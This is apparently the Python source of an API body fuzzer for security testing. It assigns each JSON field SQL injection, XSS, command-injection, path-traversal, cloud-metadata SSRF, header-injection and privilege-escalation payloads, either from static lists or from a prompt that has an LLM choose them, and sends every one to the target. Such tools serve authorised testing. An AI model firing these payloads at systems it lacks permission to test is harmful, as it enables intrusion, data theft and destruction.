"""Hybrid Body Fuzzer — LLM-planned, deterministically executed.

Two modes:
  1. Deterministic (default): regex-classifies fields, picks static payloads.
  2. Hybrid (when LLM router available): one LLM call per endpoint to generate
     context-aware payloads, then the deterministic engine executes them all.

The hybrid approach gives LLM-quality payload selection at ~$0.001/endpoint
instead of $0.10+ for pure LLM-driven fuzzing.
"""
from __future__ import annotations

import copy
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable

import httpx

logger = logging.getLogger(__name__)

LLM_PLAN_PROMPT = """\
You are a security expert. Analyze this API endpoint and its JSON body fields, \
then decide exactly which fields to fuzz and with what payloads.

## Endpoint
- Method: {method}
- URL: {url}
- Baseline status: {baseline_status}

## JSON Body Fields
{fields_table}

## Instructions
For each field worth testing, output a JSON array of objects:
```json
[
  {{"field": "dotted.path", "reason": "why this field matters", "payloads": ["payload1", "payload2", ...]}},
  ...
]
```

Rules:
- Focus on HIGH-RISK fields: auth, PII, financial, IDs, roles, amounts, emails.
- Skip low-value system/telemetry fields (timestamps, versions, UTM params).
- Generate TARGETED payloads per field type:
  - String fields with names like "email" -> email-specific SQLi, XSS, header injection
  - Numeric fields like "amount" -> negative values, zero, overflow, type confusion
  - ID/UUID fields -> IDOR (adjacent IDs, other user IDs), type confusion
  - Auth fields -> bypass payloads, empty strings, SQLi
  - Enum/role fields -> privilege escalation ("admin", "root"), invalid values
  - Boolean fields -> type confusion ("2", "null", "yes")
- Keep total payloads per field between 3-8 (not too few, not too many).
- Consider field RELATIONSHIPS (e.g., fromAccount + toAccount = transfer IDOR).
- Output ONLY the JSON array, nothing else."""


# ═══════════════════════════════════════════════════════════════════════
# Field Classification
# ═══════════════════════════════════════════════════════════════════════

class Priority:
    CRITICAL = 1
    HIGH = 2
    MEDIUM = 3
    LOW = 4


_PII_KEYS = re.compile(
    r"(ssn|social.?security|tax.?id|national.?id|passport|license.?num|"
    r"date.?of.?birth|dob|birth.?date)", re.IGNORECASE)
_AUTH_KEYS = re.compile(
    r"(password|passwd|secret|token|api.?key|auth|credential|session|"
    r"bearer|access.?key|private.?key|client.?secret)", re.IGNORECASE)
_FINANCIAL_KEYS = re.compile(
    r"(amount|price|balance|income|salary|payment|credit|loan|"
    r"account.?num|routing|iban|swift|card.?num|cvv|expir)", re.IGNORECASE)
_CONTACT_KEYS = re.compile(
    r"(email|phone|mobile|address|street|city|state|zip|postal|"
    r"first.?name|last.?name|name|username)", re.IGNORECASE)
_ENUM_KEYS = re.compile(
    r"(status|type|role|level|mode|format|language|country|"
    r"purpose|category|frequency|rating|grade)", re.IGNORECASE)
_SYSTEM_KEYS = re.compile(
    r"(user.?agent|ip.?address|fingerprint|browser|device|platform|"
    r"session.?uuid|session.?id|timestamp|created|updated|version|"
    r"is.?test|is.?mobile|is.?debug|utm|referrer|source)", re.IGNORECASE)


@dataclass
class FieldInfo:
    path: str
    value: Any
    value_type: str
    priority: int
    risk_category: str
    payloads: list[str] = field(default_factory=list)


def classify_field(path: str, value: Any) -> FieldInfo:
    leaf_key = path.split(".")[-1]
    vt = "boolean" if isinstance(value, bool) else "integer" if isinstance(value, int) else \
         "float" if isinstance(value, float) else "string" if isinstance(value, str) else \
         "array" if isinstance(value, list) else "null"

    if _AUTH_KEYS.search(leaf_key) or _AUTH_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "auth")
    if _PII_KEYS.search(leaf_key) or _PII_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "pii")
    if _FINANCIAL_KEYS.search(leaf_key) or _FINANCIAL_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "financial")
    if _CONTACT_KEYS.search(leaf_key) or _CONTACT_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.HIGH, "contact")
    if _SYSTEM_KEYS.search(leaf_key) or _SYSTEM_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.LOW, "system")
    if _ENUM_KEYS.search(leaf_key):
        return FieldInfo(path, value, vt, Priority.MEDIUM, "enum")
    if isinstance(value, bool):
        return FieldInfo(path, value, vt, Priority.MEDIUM, "boolean")
    if isinstance(value, (int, float)):
        return FieldInfo(path, value, vt, Priority.HIGH, "numeric")
    if isinstance(value, str) and len(value) > 0:
        return FieldInfo(path, value, vt, Priority.HIGH, "freetext")
    return FieldInfo(path, value, vt, Priority.MEDIUM, "other")


def classify_all_fields(data: Any, prefix: str = "") -> list[FieldInfo]:
    fields: list[FieldInfo] = []
    if isinstance(data, dict):
        for k, v in data.items():
            full = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict):
                fields.extend(classify_all_fields(v, full))
            elif isinstance(v, list):
                if v and not isinstance(v[0], (dict, list)):
                    fields.append(classify_field(full, v))
                elif v:
                    fields.extend(classify_all_fields(v[0], f"{full}[0]"))
            else:
                fields.append(classify_field(full, v))
    return fields


# ═══════════════════════════════════════════════════════════════════════
# Smart Payload Selection
# ═══════════════════════════════════════════════════════════════════════

SQLI = ["'", "' OR '1'='1", "1; DROP TABLE--", "' UNION SELECT NULL--", "1' AND SLEEP(2)--"]
XSS = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']
CMD = ["; id", "| cat /etc/passwd", "`sleep 2`"]
PATH = ["../../etc/passwd", "..\\..\\windows\\win.ini"]
SSRF = ["http://169.254.169.254/latest/meta-data/"]
HDR_INJECT = ["test\r\nX-Injected: true"]
BIZ_NUM = ["0", "-1", "-99999", "99999999", "0.001", "NaN", "Infinity", "null"]
BIZ_STR = ["", " ", "null", "undefined", "true"]
BIZ_ENUM = ["INVALID_VALUE", "", "admin", "root", "null"]
BIZ_BOOL = ["2", "null", "yes", "1", ""]


def select_payloads(f: FieldInfo) -> list[str]:
    """Fallback: static payload selection based on regex classification."""
    if f.priority == Priority.LOW:
        return []
    cat = f.risk_category
    if cat == "auth":
        return SQLI[:3] + ["", "admin", "' OR '1'='1'--"]
    if cat == "pii":
        return SQLI[:3] + XSS[:2]
    if cat == "financial":
        return BIZ_NUM + SQLI[:2]
    if cat == "contact":
        if "email" in f.path.lower():
            return SQLI[:2] + HDR_INJECT + ["a" * 500 + "@test.com"]
        if "phone" in f.path.lower():
            return SQLI[:2] + ["000000000", "' OR 1=1--"]
        return SQLI[:3] + XSS[:2] + CMD[:2]
    if cat == "numeric":
        return BIZ_NUM + SQLI[:2]
    if cat == "enum":
        return BIZ_ENUM + SQLI[:2]
    if cat == "boolean":
        return BIZ_BOOL
    if cat == "freetext":
        return SQLI[:3] + XSS[:2] + CMD[:2] + PATH[:1] + SSRF[:1]
    return []


# ═══════════════════════════════════════════════════════════════════════
# Hybrid: LLM-Planned Payload Selection (one call per endpoint)
# ═══════════════════════════════════════════════════════════════════════

def _build_fields_table(fields: list[FieldInfo]) -> str:
    lines = ["| Field Path | Type | Current Value | Regex Category | Priority |",
             "|------------|------|---------------|----------------|----------|"]
    for f in fields:
        val_preview = str(f.value)[:40] if f.value is not None else "null"
        lines.append(f"| {f.path} | {f.value_type} | {val_preview} | {f.risk_category} | P{f.priority} |")
    return "\n".join(lines)


async def llm_plan_payloads(
    fields: list[FieldInfo],
    method: str,
    url: str,
    baseline_status: int,
    router: Any,
    model: str,
) -> list[FieldInfo]:
    """Ask the LLM (one call) which fields to fuzz and with what payloads.

    Returns the same FieldInfo list but with LLM-chosen payloads assigned.
    Falls back to static selection on any failure.
    """
    fields_table = _build_fields_table(fields)
    prompt = LLM_PLAN_PROMPT.format(
        method=method, url=url, baseline_status=baseline_status, fields_table=fields_table,
    )
    try:
        response = router.complete(
            model=model,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000,
        )
        content = response.choices[0].message.content or ""
        start = content.find("[")
        end = content.rfind("]") + 1
        if start < 0 or end <= start:
            logger.warning("LLM payload plan: no JSON array found, falling back to static")
            return _apply_static_payloads(fields)
        plan = json.loads(content[start:end])
    except Exception as e:
        logger.warning("LLM payload planning failed (%s), falling back to static", e)
        return _apply_static_payloads(fields)

    field_map = {f.path: f for f in fields}
    assigned = set()
    for item in plan:
        if not isinstance(item, dict):
            continue
        path = item.get("field", "")
        payloads = item.get("payloads", [])
        if path in field_map and isinstance(payloads, list) and payloads:
            field_map[path].payloads = [str(p) for p in payloads[:15]]
            field_map[path].priority = min(field_map[path].priority, Priority.HIGH)
            assigned.add(path)
            logger.info("LLM plan: %s -> %d payloads (%s)", path, len(payloads),
                        item.get("reason", "")[:60])

    if not assigned:
        logger.warning("LLM plan returned no usable fields, falling back to static")
        return _apply_static_payloads(fields)

    for f in fields:
        if f.path not in assigned:
            f.payloads = []

    logger.info("LLM planned %d fields for fuzzing (skipped %d)", len(assigned), len(fields) - len(assigned))
    return fields


def _apply_static_payloads(fields: list[FieldInfo]) -> list[FieldInfo]:
    """Apply regex-based static payloads (fallback)."""
    for f in fields:
        f.payloads = select_payloads(f)
    return fields


# ═══════════════════════════════════════════════════════════════════════
# Deterministic Execution Engine
# ═══════════════════════════════════════════════════════════════════════

ERROR_INDICATORS = [
    "error", "exception", "sql", "syntax", "undefined", "stack trace",
    "internal server", "traceback", "fatal", "mysql", "postgresql",
    "sqlite", "oracle", "unexpected", "parse error",
]


@dataclass
class FuzzResult:
    field_path: str
    field_info: FieldInfo
    payload: str
    status_code: int
    baseline_status: int
    body_snippet: str
    anomaly: bool
    anomaly_reasons: list[str]
    reflected: bool
    timing_ms: float


def _mutate_field(data: dict, field_path: str, value: Any) -> dict:
    clone = copy.deepcopy(data)
    parts = field_path.split(".")
    current = clone
    for part in parts[:-1]:
        if "[" in part:
            key, idx = part.rstrip("]").split("[")
            current = current[key][int(idx)]
        elif isinstance(current, dict) and part in current:
            current = current[part]
        else:
            return clone
    final = parts[-1]
    if "[" in final:
        key, idx = final.rstrip("]").split("[")
        current[key][int(idx)] = value
    elif isinstance(current, dict):
        current[final] = value
    return clone


async def fuzz_body(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    original_body: str,
    headers: dict[str, str] | None = None,
    max_priority: int = Priority.HIGH,
    on_progress: Callable | None = None,
    llm_router: Any = None,
    llm_model: str | None = None,
) -> list[FuzzResult]:
    """Run body fuzzing. If llm_router is provided, uses hybrid LLM-planned
    payload selection (one cheap LLM call); otherwise falls back to static."""
    try:
        body_data = json.loads(original_body)
    except (json.JSONDecodeError, TypeError):
        logger.warning("Cannot parse body as JSON for fuzzing")
        return []

    fields = classify_all_fields(body_data)
    target_fields = [f for f in fields if f.priority <= max_priority]

    if llm_router and llm_model:
        logger.info("Using HYBRID mode: LLM plans payloads, engine executes")
        if on_progress:
            on_progress("llm_planning", {"fields_count": len(target_fields), "mode": "hybrid"})
        target_fields = await llm_plan_payloads(
            target_fields, method, url, 200, llm_router, llm_model,
        )
        target_fields = [f for f in target_fields if f.payloads]
    else:
        logger.info("Using STATIC mode: regex-classified payloads")
        for f in target_fields:
            f.payloads = select_payloads(f)

    total = sum(len(f.payloads) for f in target_fields)
    logger.info("Body fuzzer: %d fields, %d requests (priority <= P%d)", len(target_fields), total, max_priority)

    hdrs = dict(headers) if headers else {}
    hdrs.setdefault("Content-Type", "application/json")

    try:
        baseline_resp = await client.request(method, url, headers=hdrs, content=original_body)
        baseline_status = baseline_resp.status_code
        baseline_len = len(baseline_resp.text)
    except Exception as e:
        logger.warning("Baseline request failed: %s", e)
        return []

    results: list[FuzzResult] = []
    req_num = 0

    for f in target_fields:
        for payload in f.payloads:
            req_num += 1
            if on_progress:
                on_progress("fuzz_request", {
                    "field": f.path, "priority": f.priority, "category": f.risk_category,
                    "payload": str(payload)[:80], "request_num": req_num, "total": total,
                })
            try:
                mutated = json.dumps(_mutate_field(body_data, f.path, payload))
                start = time.perf_counter()
                resp = await client.request(method, url, headers=hdrs, content=mutated)
                elapsed = (time.perf_counter() - start) * 1000
                resp_body = resp.text
                resp_lower = resp_body.lower()

                reasons: list[str] = []
                if resp.status_code != baseline_status:
                    reasons.append(f"status:{baseline_status}->{resp.status_code}")
                if any(ind in resp_lower for ind in ERROR_INDICATORS):
                    reasons.append(f"errors:{[i for i in ERROR_INDICATORS if i in resp_lower][:3]}")
                if baseline_len > 0 and abs(len(resp_body) - baseline_len) / max(baseline_len, 1) > 0.3:
                    reasons.append(f"length:{baseline_len}->{len(resp_body)}")
                if elapsed > 3000:
                    reasons.append(f"slow:{elapsed:.0f}ms")
                reflected = str(payload) in resp_body

                results.append(FuzzResult(
                    field_path=f.path, field_info=f, payload=str(payload),
                    status_code=resp.status_code, baseline_status=baseline_status,
                    body_snippet=resp_body[:300], anomaly=bool(reasons) or reflected,
                    anomaly_reasons=reasons, reflected=reflected, timing_ms=round(elapsed, 2),
                ))
            except Exception as e:
                results.append(FuzzResult(
                    field_path=f.path, field_info=f, payload=str(payload),
                    status_code=0, baseline_status=baseline_status, body_snippet=str(e)[:200],
                    anomaly=True, anomaly_reasons=[f"error:{e}"], reflected=False, timing_ms=0,
                ))
    return results


def format_fuzz_results_for_llm(results: list[FuzzResult]) -> str:
    anomalies = [r for r in results if r.anomaly]
    if not anomalies:
        return (f"\n## Body Fuzz Results\n\nTested {len(results)} payloads across body fields. "
                f"No anomalies — all responses matched baseline.\n")
    lines = [f"\n## Body Fuzz Results\n",
             f"Tested {len(results)} payloads, found {len(anomalies)} anomalies:\n"]
    for r in anomalies:
        lines.append(f"- **{r.field_path}** [{r.field_info.risk_category}/P{r.field_info.priority}]")
        lines.append(f"  Payload: `{r.payload[:100]}`")
        lines.append(f"  Status: {r.status_code} (baseline: {r.baseline_status}) | {r.timing_ms}ms")
        if r.reflected:
            lines.append(f"  !! REFLECTED in response")
        if r.anomaly_reasons:
            lines.append(f"  Reasons: {', '.join(r.anomaly_reasons)}")
        lines.append(f"  Response: {r.body_snippet[:150]}")
        lines.append("")
    lines.append("### LLM Follow-up")
    lines.append("Investigate anomalies above with deeper targeted payloads using fuzz_parameter.\n")
    return "\n".join(lines)
